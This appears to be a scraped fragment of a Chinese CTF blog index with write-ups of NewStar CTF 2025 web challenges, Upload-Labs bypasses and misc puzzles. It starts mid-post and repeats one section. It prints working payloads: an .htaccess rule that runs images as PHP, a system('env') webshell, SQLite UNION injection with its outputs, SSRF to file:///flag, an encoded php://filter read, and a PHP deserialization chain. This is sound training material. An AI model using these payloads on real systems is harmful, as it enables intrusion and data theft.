       $test = 0;    try &#123;        @eval(&quot;\\$test = $input;&quot;);    &#125; catch (Error $e) &#123;        die(&quot;表达式错误&quot;);    &#125;        if ($test == 2025) &#123;        $flag = generate_dynamic_flag($flag_secret);        echo &quot;&lt;div class=&#x27;success&#x27;&gt;拿下flag！&lt;/div&gt;&quot;;        echo &quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: &#123;$flag&#125;&lt;/div&gt;&lt;/div&gt;&quot;;    &#125; else &#123;        echo &quot;&lt;div class=&#x27;error&#x27;&gt;大哥哥泥把数字算错了: $test ≠ 2025&lt;/div&gt;&quot;;    &#125;&#125; else &#123;    ?&gt;&lt;?php &#125; ?&gt;\n\n还是代码审计\npayload：\n(~((~0)*2026))\n\n黑客小W的故事（1）很简单考察http协议相关内容，根据提示要求来即可。\n先抓包，修改点击次数即可到下一关。\n\n接着，到蘑菇先生那，传参\n\n下一步用POST传一个guding\n\n下一步用DELETE，传入chongzi，然后到下一关，去找习奥\n\n修改ua头\n\nDashSlash&#x2F;5.0同理，注意不要忘了&#x2F;5.0，低了不行，两个一起发过去\n最后去到最后一关获得flag\nstrange_login最简单的sql注入\n\nMiscOSINT-天空belong和去年的一样，查exif，再去搜B-7198,很快就能找到，我是在flightaware里找的。\nMISC城邦-压缩术根据提示直接爆破得到第一层密码\n\n下一层,根据提示‘下一扇门明明没有密码，为什么还是要输入密码呢？’，是伪加密直接010editor修改到下一层。\n根据文件名bkcrack，直接明文攻击，如下：\n\n我不要革命失败根据题目提示来即可\n\n崩溃类型：CRITICAL_PROCESS_DIED故障进程：svchost.exe\n\nEZ_fence考了个jpg文件高度修改，栅栏密码，文件隐写，以及base64换表。\n结合题目“残缺的照片”，图片应该是修改了高度。\n\n修改高度后可以看到图片下方多了文字。\n\n结合题目“4颗钉子才能钉住”，接着随波逐流，如下\n\n非常像base编码，结合下方码表文字，得到一个密码（不知道为什么赛博厨子一直报错，弄了好久sad）\n\n结合题目“照片里面似乎藏着秘密“，binwalk一下，发现隐藏有rar压缩包。提取出来，用密码解压即可获得flag。\n前有文字，所以搜索很有用track1：零宽隐写+base64编码（在线工具解决即可）\n\ntrack2：snow隐写+fxxkbrain+莫斯密码\n\ntrack3：字频统计（很明显的challenge字样）\n\n拼接到一起就能获得flag\n","tags":["CTF"]},{"title":"upload_lab_master","url":"/2025/11/24/upload-lab-master/","content":"Upload-Labs\n下午没事干，巩固下文件上传的内容吧\n\npass1仅在前端js进行验证，可以浏览器禁用javascript或者上传图片，绕过前端验证再通过抓包修改后缀实现。\npass2验证Content-Type类型，上传php文件修改为jpg等图片的mime类型即可\npass3提示：不允许上传.asp,.aspx,.php,.jsp后缀文件！应该做了黑名单限制，尝试使用其他后缀php2、php3、php4、php5、php6、php7、pht、phtm、phtml。使用phtml上传成功，后续访问发现访问不到，查看抓包历史发现修改了名字，再访问，成功。\npass4尝试了一下无法上传，查看提示禁用了大量文件，但没有禁用htaccess。这里要使用.htaccess文件\n&lt;FilesMatch &quot;pass4.jpg&quot;&gt;    SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n将jpg文件解析为php文件\npass5查看提示说明有readme.php文件\npass6黑名单大小写过滤不全，大小写绕过\npass7空格绕过\npass8点绕过\npass9::$DATA绕过（Windows特性）\npass10.php. .\npass11.pphphp文件后缀双写绕过\npass12路径可控%00截断\npass13","tags":["文件上传"]},{"title":"NewStar CTF 2025复现","url":"/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/","content":"\n啊啊啊啊啊啊啊好菜好菜好菜，复现复现复现T_T\n\nWeek1multi-headach3访问&#x2F;robots.txt，接着访问&#x2F;hidden.php，但是重定向了，查看相应头，得到flag。\n\n宇宙的中心是php抓个包发现路径&#x2F;s3kret.php\n&lt;?phphighlight_file(__FILE__);include &quot;flag.php&quot;;if(isset($_POST[&#x27;newstar2025&#x27;]))&#123;    $answer = $_POST[&#x27;newstar2025&#x27;];    if(intval($answer)!=47&amp;&amp;intval($answer,0)==47)&#123;        echo $flag;    &#125;else&#123;        echo &quot;你还未参透奥秘&quot;;    &#125;&#125;\n\n\nintval() 是 PHP 中用于获取变量整数值的函数，它可以将各种类型的值转换为整数。(将不同进制转换为十进制整数)。intval($answer,0)，当 intval() 的第二个参数设置为 0 时，函数会根据字符串的格式自动检测进制。\n\n&lt;?php$tests = [&#x27;47&#x27;, &#x27;047&#x27;, &#x27;0x2f&#x27;, &#x27;0X2F&#x27;, &#x27;0b101111&#x27;];foreach($tests as $t)&#123;    echo $t,&quot; =&gt; intval=&quot;,    intval($t),    &quot;  intval(,0)=&quot;,    intval($t,0),    PHP_EOL;&#125;\n\n0x2f满足条件\nhackbar提交即可获得flag。\n别笑你也过不了第二关score = 1000000;currentLevel = 1;endLevel();//控制台中输入\n\n我真得控制你了抓包后让ai来审计前端代码，有保护层，书签绕过\njavascript:(function()&#123;document.getElementById(&#x27;shieldOverlay&#x27;)?.remove();document.getElementById(%27accessButton%27).disabled=false;document.getElementById(%27accessButton%27).classList.add(%27active%27);&#125;)()\n\nai解析：\n\njavascript: 协议\n\njavascript:代码内容\n\n\n这是浏览器支持的特殊协议\n允许在地址栏或书签中直接执行JavaScript代码\n相当于在当前页面注入并执行脚本\n\n\n立即执行函数\n\njavascript\n(function()&#123; ... &#125;)()\n\n\n创建一个匿名函数并立即执行\n避免污染全局作用域\n\n\n移除保护层\n\njavascript\ndocument.getElementById(&#x27;shieldOverlay&#x27;)?.remove();\n\n\n?. 是可选链操作符，如果元素存在才执行remove()\n直接删除遮挡的DOM元素\n\n\n启用按钮\n\njavascript\ndocument.getElementById(&#x27;accessButton&#x27;).disabled = false;document.getElementById(&#x27;accessButton&#x27;).classList.add(&#x27;active&#x27;);\n\n\n移除按钮的禁用状态\n添加激活样式类\n\n接着，下一关弱口令爆破即可，获得密码。\n\n接着\n&lt;?phperror_reporting(0);function generate_dynamic_flag($secret) &#123;    return getenv(&quot;ICQ_FLAG&quot;) ?: &#x27;default_flag&#x27;;&#125;if (isset($_GET[&#x27;newstar&#x27;])) &#123;    $input = $_GET[&#x27;newstar&#x27;];        if (is_array($input)) &#123;        die(&quot;恭喜掌握新姿势&quot;);    &#125;        if (preg_match(&#x27;/[^\\d*\\/~()\\s]/&#x27;, $input)) &#123;        die(&quot;老套路了，行不行啊&quot;);    &#125;        if (preg_match(&#x27;/^[\\d\\s]+$/&#x27;, $input)) &#123;        die(&quot;请输入有效的表达式&quot;);    &#125;        $test = 0;    try &#123;        @eval(&quot;\\$test = $input;&quot;);    &#125; catch (Error $e) &#123;        die(&quot;表达式错误&quot;);    &#125;        if ($test == 2025) &#123;        $flag = generate_dynamic_flag($flag_secret);        echo &quot;&lt;div class=&#x27;success&#x27;&gt;拿下flag！&lt;/div&gt;&quot;;        echo &quot;&lt;div class=&#x27;flag-container&#x27;&gt;&lt;div class=&#x27;flag&#x27;&gt;FLAG: &#123;$flag&#125;&lt;/div&gt;&lt;/div&gt;&quot;;    &#125; else &#123;        echo &quot;&lt;div class=&#x27;error&#x27;&gt;大哥哥泥把数字算错了: $test ≠ 2025&lt;/div&gt;&quot;;    &#125;&#125; else &#123;    ?&gt;&lt;?php &#125; ?&gt;\n\n还是代码审计\npayload：\n(~((~0)*2026))\n\n黑客小W的故事（1）很简单考察http协议相关内容，根据提示要求来即可。\n先抓包，修改点击次数即可到下一关。\n\n接着，到蘑菇先生那，传参\n\n下一步用POST传一个guding\n\n下一步用DELETE，传入chongzi，然后到下一关，去找习奥\n\n修改ua头\n\nDashSlash&#x2F;5.0同理，注意不要忘了&#x2F;5.0，低了不行，两个一起发过去\n最后去到最后一关获得flag\nstrange_login最简单的sql注入\n\nWeek2DD加速器；分隔造成了命令执行\n\n白帽小K的故事（1）一道文件上传的题目，多了一层寻找接口\n以下为敏感接口\n\n结合js代码，尝试访问这个接口\n\n由此图可以发现服务器正在将star.mp3文件当作php代码去解析，那么在这里我们便能进行文件上传了\n\n直接解析了8.mp3中的内容:\n&lt;?php system(&#x27;env&#x27;); ?&gt;\n\n真的是签到诶&lt;?phphighlight_file(__FILE__);$cipher = $_POST[&#x27;cipher&#x27;] ?? &#x27;&#x27;;function atbash($text) &#123;  $result = &#x27;&#x27;;  foreach (str_split($text) as $char) &#123;    if (ctype_alpha($char)) &#123;      $is_upper = ctype_upper($char);      $base = $is_upper ? ord(&#x27;A&#x27;) : ord(&#x27;a&#x27;);      $offset = ord(strtolower($char)) - ord(&#x27;a&#x27;);      $new_char = chr($base + (25 - $offset));      $result .= $new_char;    &#125; else &#123;      $result .= $char;    &#125;  &#125;  return $result;&#125;if ($cipher) &#123;  $cipher = base64_decode($cipher);  $encoded = atbash($cipher);  $encoded = str_replace(&#x27; &#x27;, &#x27;&#x27;, $encoded);  $encoded = str_rot13($encoded);  @eval($encoded);  exit;&#125;$question = &quot;真的是签到吗？&quot;;$answer = &quot;真的很签到诶！&quot;;$res =  $question . &quot;&lt;br&gt;&quot; . $answer . &quot;&lt;br&gt;&quot;;echo $res . $res . $res . $res . $res;?&gt; \n\n代码审计题目\n编码链逻辑为：先进行base64解码-&gt;接着执行atbash-&gt;再删除所有的空格-&gt;再进行rot13-&gt;最后命令执行\n我们发送逻辑需要与之相反\nAtbash 是一种替换密码：A → Z, B → Y, C → X, …, Z → A  a → z, b → y, c → x, …, z → a  非字母字符保持不变\npayload：\n\n搞点哦润吉吃吃橘脚本题，头疼，写不来。\nimport reimport pyperclipimport timeimport sys# 用于存储上次剪贴板的内容，以检测是否有新的表达式last_clipboard_content = &quot;&quot;def calculate_token(expression):    &quot;&quot;&quot;    解析表达式字符串，使用当前时间计算 Token，并返回结果。    &quot;&quot;&quot;    # 正则表达式寻找 &quot;* 数字) ^ 0x十六进制&quot;    match = re.search(r&#x27;\\*\\s*(\\d+)\\)\\s*\\^\\s*(0x[0-9a-fA-F]+)&#x27;, expression)    if not match:        # 如果不是有效的表达式格式，则忽略        return None    try:        multiplier = int(match.group(1))        xor_hex = match.group(2)        xor_value = int(xor_hex, 16)    except Exception:        return None    # 获取当前 Unix 时间戳    t = int(time.time())        # 计算 Token: (t * multiplier) ^ xor_value    token = (t * multiplier) ^ xor_value        print(&quot;\\n[+] 发现新表达式并计算:&quot;)    print(f&quot;  - 表达式: &#123;expression.strip()&#125;&quot;)    print(f&quot;  - 乘数/异或值: &#123;multiplier&#125; / &#123;xor_hex&#125;&quot;)    print(f&quot;  - 使用时间戳 (t): &#123;t&#125;&quot;)    print(f&quot;  - 计算出的 Token: &#123;token&#125;&quot;)    return str(token)def monitor_clipboard():    &quot;&quot;&quot;    持续监控剪贴板内容，检测到有效表达式后进行计算和替换。    &quot;&quot;&quot;    global last_clipboard_content    print(&quot;&gt;&gt;&gt; 脚本正在运行。请在网页上点击&#x27;开始验证&#x27;并复制新的表达式。&quot;)    print(&quot;&gt;&gt;&gt; 发现新表达式后，答案会瞬间替换您的剪贴板内容。&quot;)    print(&quot;&gt;&gt;&gt; 按 Ctrl+C 停止脚本。&quot;)        # 初始化 last_clipboard_content    try:        last_clipboard_content = pyperclip.paste().strip()    except pyperclip.PyperclipException:        print(&quot;[-] 错误：无法访问剪贴板。请确保您在命令行环境中运行，或者尝试手动输入版本。&quot;)        sys.exit(1)    while True:        try:            # 1. 读取当前剪贴板内容            current_clipboard_content = pyperclip.paste().strip()                        # 2. 检测内容是否更新 且 长度合理（排除空内容和很短的内容）            if current_clipboard_content != last_clipboard_content and len(current_clipboard_content) &gt; 20:                                # 3. 尝试计算 Token                token_result = calculate_token(current_clipboard_content)                                if token_result:                    # 4. 计算成功，将 Token 答案写入剪贴板                    pyperclip.copy(token_result)                    print(f&quot;\\n&lt;&lt;&lt; 答案已写入剪贴板！请立即粘贴提交。&gt;&gt;&gt;&quot;)                    # 更新 last_clipboard_content 为计算结果，避免重复触发                    last_clipboard_content = token_result                else:                    # 如果不是有效的表达式，仅更新 last_clipboard_content，避免重复触发检查                    last_clipboard_content = current_clipboard_content                                time.sleep(0.5) # 每 0.5 秒检查一次剪贴板        except KeyboardInterrupt:            print(&quot;\\n脚本已停止。&quot;)            break        except pyperclip.PyperclipException:            # 忽略一些剪贴板访问错误            pass        except Exception as e:            print(f&quot;[-] 发生未知错误: &#123;e&#125;&quot;)            time.sleep(1)if __name__ == &quot;__main__&quot;:    monitor_clipboard()\n\n专业里大佬的脚本\n小 E 的管理系统根据提示先进行fuzz，看看过滤了哪些东西\n\n很多如#，—+，–，&#x3D;，；，‘，”等都被过滤了\n?id=1%0aORDER%0aBY%0a6\n\n回显\n&#123;&quot;error&quot;:&quot;database error: Unable to prepare statement: 1st ORDER BY term out of range - should be between 1 and 5&quot;&#125;\n\n判断有5列\n?id=1%0aUNION%0aselect%0a*%0afrom%0a((select%0a1)A%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)C%0ajoin%0a(select%0a4)D%0ajoin%0a(select%0a5)E)\n\n\n绕过逗号方式：union select * from ((select 1)A join (select 2)B join (select 3)C)\n\n回显\n&#123;&quot;id&quot;:1,&quot;cpu&quot;:2,&quot;ram&quot;:3,&quot;status&quot;:4,&quot;lastChecked&quot;:5&#125;,&#123;&quot;id&quot;:1,&quot;cpu&quot;:&quot;23%&quot;,&quot;ram&quot;:&quot;45%&quot;,&quot;status&quot;:&quot;Online&quot;,&quot;lastChecked&quot;:&quot;2025-12-03 12:24:30&quot;&#125;\n\n回显点都判断出来了\n?id=1%0aUNION%0aselect%0a*%0afrom%0a((select%0asqlite_version())A%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)C%0ajoin%0a(select%0a4)D%0ajoin%0a(select%0a5)E)\n\n回显\n&#123;&quot;id&quot;:1,&quot;cpu&quot;:&quot;23%&quot;,&quot;ram&quot;:&quot;45%&quot;,&quot;status&quot;:&quot;Online&quot;,&quot;lastChecked&quot;:&quot;2025-12-03 12:24:30&quot;&#125;,&#123;&quot;id&quot;:&quot;3.46.1&quot;,&quot;cpu&quot;:2,&quot;ram&quot;:3,&quot;status&quot;:4,&quot;lastChecked&quot;:5&#125;\n\n判断出数据库类型为sqlite\n?id=1%0aUNION%0aselect%0a*%0afrom%0a((select%0agroup_concat(name)%0afrom%0asqlite_master)A%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)C%0ajoin%0a(select%0a4)D%0ajoin%0a(select%0a5)E)\n\n得到所有的表名\n&#123;&quot;id&quot;:1,&quot;cpu&quot;:&quot;23%&quot;,&quot;ram&quot;:&quot;45%&quot;,&quot;status&quot;:&quot;Online&quot;,&quot;lastChecked&quot;:&quot;2025-12-03 12:24:30&quot;&#125;,&#123;&quot;id&quot;:&quot;node_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequence&quot;,&quot;cpu&quot;:2,&quot;ram&quot;:3,&quot;status&quot;:4,&quot;lastChecked&quot;:5&#125;\n\n所有表名：node_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequence\n?id=1%0aUNION%0aselect%0a*%0afrom%0a((select%0agroup_concat(config_value)%0afrom%0asys_config)A%0ajoin%0a(select%0a2)b%0ajoin%0a(select%0a3)C%0ajoin%0a(select%0a4)D%0ajoin%0a(select%0a5)E)\n\n&#123;&quot;id&quot;:1,&quot;cpu&quot;:&quot;23%&quot;,&quot;ram&quot;:&quot;45%&quot;,&quot;status&quot;:&quot;Online&quot;,&quot;lastChecked&quot;:&quot;2025-12-03 12:24:30&quot;&#125;,&#123;&quot;id&quot;:&quot;flag&#123;5c1e28fe-131d-541b-4ff2-835c10403d68&#125;&quot;,&quot;cpu&quot;:2,&quot;ram&quot;:3,&quot;status&quot;:4,&quot;lastChecked&quot;:5&#125;\n\n得到flag\nWeek3ssrf\nmygo\n请求到了flag.php的内容。\n接着直接file:&#x2F;&#x2F;读flag\n\npayload：\n/index.php?proxy=http://127.0.0.1/flag.php?soyorin=file:///flag\n\nmirror_gate文件上传题\n&lt;!-- flag is in flag.php --&gt;    &lt;!-- HINT: c29tZXRoaW5nX2lzX2luXy91cGxvYWRzLw== --&gt;\n\n大无语，做题的时候没看到这个提示，呜呜呜呜呜呜呜呜呜呜呜呜呜呜T_T……….\nbase64解码：something_is_in_&#x2F;uploads&#x2F;\n那么就去看看，直接访问403了，存在该目录。\n接着目录爆破一下\n\n扫到了.htaccess\n访问：\nAddType application/x-httpd-php .webp\n\n配置将webp文件解析为php文件\n接下来就好进行文件上传了\n\n（注：要在实在的webp文件中添加命令执行代码）\n最后访问即可在环境变量中获得flag。\n小E的秘密计划进入后题目提示：先找到网站备份文件\n目录扫描一下，果然找到了www.zip\n下载下来发现目录&#x2F;public-555edc76-9621-4997-86b9-01483a50293e\n随便登录一下，登录失败，题目又提示，在git里找吧，好，我们就去git里找。\nez_clainheader(&#x27;Content-Type: text/html; charset=utf-8&#x27;);function filter($file) &#123;    $waf = array(&#x27;/&#x27;,&#x27;:&#x27;,&#x27;php&#x27;,&#x27;base64&#x27;,&#x27;data&#x27;,&#x27;zip&#x27;,&#x27;rar&#x27;,&#x27;filter&#x27;,&#x27;flag&#x27;);    foreach ($waf as $waf_word) &#123;        if (stripos($file, $waf_word) !== false) &#123;            echo &quot;waf:&quot;.$waf_word;            return false;        &#125;    &#125;    return true;&#125;function filter_output($data) &#123;    $waf = array(&#x27;f&#x27;);    foreach ($waf as $waf_word) &#123;        if (stripos($data, $waf_word) !== false) &#123;            echo &quot;waf:&quot;.$waf_word;            return false;        &#125;    &#125;    while (true) &#123;        $decoded = base64_decode($data, true);        if ($decoded === false || $decoded === $data) &#123;            break;        &#125;        $data = $decoded;    &#125;    foreach ($waf as $waf_word) &#123;        if (stripos($data, $waf_word) !== false) &#123;            echo &quot;waf:&quot;.$waf_word;            return false;        &#125;    &#125;    return true;&#125;if (isset($_GET[&#x27;file&#x27;])) &#123;    $file = $_GET[&#x27;file&#x27;];    if (filter($file) !== true) &#123;        die();    &#125;    $file = urldecode($file);    $data = file_get_contents($file);    if (filter_output($data) !== true) &#123;        die();    &#125;    echo $data;&#125;highlight_file(__FILE__);?&gt;\n\nban了这些东西：’&#x2F;‘,’:’,’php’,’base64’,’data’,’zip’,’rar’,’filter’,’flag’\n并且对输出有限制：过滤了f\n\nphp:&#x2F;&#x2F;filter&#x2F;string.rot13&#x2F;resource&#x3D;&#x2F;flag\n\n$file &#x3D; urldecode($file);\n进行双重url编码\npayload：\n%25%37%30%25%36%38%25%37%30%25%33%41%25%32%46%25%32%46%25%36%36%25%36%39%25%36%43%25%37%34%25%36%35%25%37%32%25%32%46%25%37%33%25%37%34%25%37%32%25%36%39%25%36%45%25%36%37%25%32%45%25%37%32%25%36%46%25%37%34%25%33%31%25%33%33%25%32%46%25%37%32%25%36%35%25%37%33%25%36%46%25%37%35%25%37%32%25%36%33%25%36%35%25%33%44%25%32%46%25%36%36%25%36%43%25%36%31%25%36%37\n\nwho’sstissti\nfrom flask import Flask, jsonify, request, render_template_string, render_templateimport sys, randomfunc_List = [&quot;get_close_matches&quot;, &quot;dedent&quot;, &quot;fmean&quot;,              &quot;listdir&quot;, &quot;search&quot;, &quot;randint&quot;, &quot;load&quot;, &quot;sum&quot;,              &quot;findall&quot;, &quot;mean&quot;, &quot;choice&quot;]need_List = random.sample(func_List, 5)need_List = dict.fromkeys(need_List, 0)BoleanFlag = FalseRealFlag = __import__(&quot;os&quot;).environ.get(&quot;ICQ_FLAG&quot;, &quot;flag&#123;test_flag&#125;&quot;)# 清除 ICQ_FLAG__import__(&quot;os&quot;).environ[&quot;ICQ_FLAG&quot;] = &quot;&quot;def trace_calls(frame, event, arg):  if event == &#x27;call&#x27;:    func_name = frame.f_code.co_name    # print(func_name)    if func_name in need_List:      need_List[func_name] = 1    if all(need_List.values()):      global BoleanFlag      BoleanFlag = True  return trace_callsapp = Flask(__name__)@app.route(&#x27;/&#x27;, methods=[&quot;GET&quot;, &quot;POST&quot;])def index():  submit = request.form.get(&#x27;submit&#x27;)  if submit:    sys.settrace(trace_calls)    print(render_template_string(submit))    sys.settrace(None)    if BoleanFlag:      return jsonify(&#123;&quot;flag&quot;: RealFlag&#125;)    return jsonify(&#123;&quot;status&quot;: &quot;OK&quot;&#125;)  return render_template_string(&#x27;&#x27;&#x27;&lt;!DOCTYPE html&gt;&lt;html lang=&quot;zh-cn&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;首页&lt;/title&gt;&lt;/head&gt;&lt;body&gt;    &lt;h1&gt;提交你的代码，让后端看看你的厉害！&lt;/h1&gt;    &lt;form action=&quot;/&quot; method=&quot;post&quot;&gt;        &lt;label for=&quot;submit&quot;&gt;提交一下：&lt;/label&gt;        &lt;input type=&quot;text&quot; id=&quot;submit&quot; name=&quot;submit&quot; required&gt;        &lt;button type=&quot;submit&quot;&gt;提交&lt;/button&gt;    &lt;/form&gt;    &lt;div style=&quot;margin-top: 20px;&quot;&gt;        &lt;p&gt; 尝试调用到这些函数！ &lt;/p&gt;    &#123;% for func in funcList %&#125;        &lt;p&gt;&#123;&#123; func &#125;&#125;&lt;/p&gt;    &#123;% endfor %&#125;    &lt;div style=&quot;margin-top: 20px; color: red;&quot;&gt;        &lt;p&gt; 你目前已经调用了 &#123;&#123; called_funcs|length &#125;&#125; 个函数：&lt;/p&gt;        &lt;ul&gt;        &#123;% for func in called_funcs %&#125;            &lt;li&gt;&#123;&#123; func &#125;&#125;&lt;/li&gt;        &#123;% endfor %&#125;        &lt;/ul&gt;    &lt;/div&gt;&lt;/body&gt;&lt;script&gt;    &lt;/script&gt;&lt;/html&gt;                                &#x27;&#x27;&#x27;                                ,                                 funcList = need_List, called_funcs = [func for func, called in need_List.items() if called])if __name__ == &#x27;__main__&#x27;:  app.run(host=&#x27;0.0.0.0&#x27;, port=5000, debug=False)\n\n\n\n\n\n\n\nWeek4小羊走迷宫死在传参上了\nphp get或post变量名中非法字符转化规则_php非法字符-CSDN博客\n&lt;?phpclass startPoint&#123;    public $direction;    function __wakeup()&#123;        echo &quot;gogogo出发咯 &quot;;        $way = $this-&gt;direction;        return $way();    &#125;&#125;class Treasure&#123;    public $door;    public $chest;    function __get($arg)&#123;        echo &quot;拿到钥匙咯，开门！ &quot;;        $this -&gt; door -&gt; open();    &#125;    function __toString()&#123;        echo &quot;小羊真可爱! &quot;;        return $this -&gt; chest -&gt; key;    &#125;&#125;class SaySomething&#123;    public $sth;    function __invoke()    &#123;        echo &quot;说点什么呢 &quot;;        return &quot;说： &quot;.$this-&gt;sth;    &#125;&#125;class endPoint&#123;    public $path;    function __call($arg1,$arg2)&#123;        echo &quot;到达终点！现在尝试获取flag吧&quot;.&quot;&lt;br&gt;&quot;;        echo file_get_contents($this-&gt;path);    &#125;&#125;$start = new startPoint();$say = new SaySomething();$treasure = new Treasure();$end = new endPoint();// 建立引用关系（与之前分析一致）$end-&gt;path = &#x27;flag.php&#x27;;   // 目标文件，根据实际情况修改$treasure-&gt;door = $end;    // Treasure-&gt;door 指向 endPoint$treasure-&gt;chest = $treasure; // 自引用：chest 指向自己$say-&gt;sth = $treasure;     // SaySomething-&gt;sth 指向 Treasure$start-&gt;direction = $say;  // startPoint-&gt;direction 指向 SaySomething// -----------------------------// 序列化并输出// -----------------------------$serialized = serialize($start);$b64 = base64_encode($serialized);echo $serialized;echo $b64;\n\n\n?ma[ze.path&#x3D;TzoxMDoic3RhcnRQb2ludCI6MTp7czo5OiJkaXJlY3Rpb24iO086MTI6IlNheVNvbWV0aGluZyI6MTp7czozOiJzdGgiO086ODoiVHJlYXN1cmUiOjI6e3M6NDoiZG9vciI7Tzo4OiJlbmRQb2ludCI6MTp7czo0OiJwYXRoIjtzOjg6ImZsYWcucGhwIjt9czo1OiJjaGVzdCI7cjozO319fQ&#x3D;&#x3D;\n\n武功秘籍dcrcms,跟着网上文章复现即可。后台账号密码都为admin\nWeek5","tags":["CTF"]}]